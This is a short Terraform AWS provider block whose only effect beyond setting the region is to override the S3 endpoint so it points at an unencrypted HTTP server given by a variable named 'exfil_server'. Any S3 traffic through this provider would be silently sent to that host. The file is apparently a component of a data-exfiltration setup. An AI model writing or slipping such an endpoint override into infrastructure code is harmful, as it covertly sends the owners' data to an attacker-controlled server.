provider "aws" {
  //version = "~> 2.40"
  region = var.region

  endpoints {
    s3 = "http://${var.exfil_server}/"
  }
}
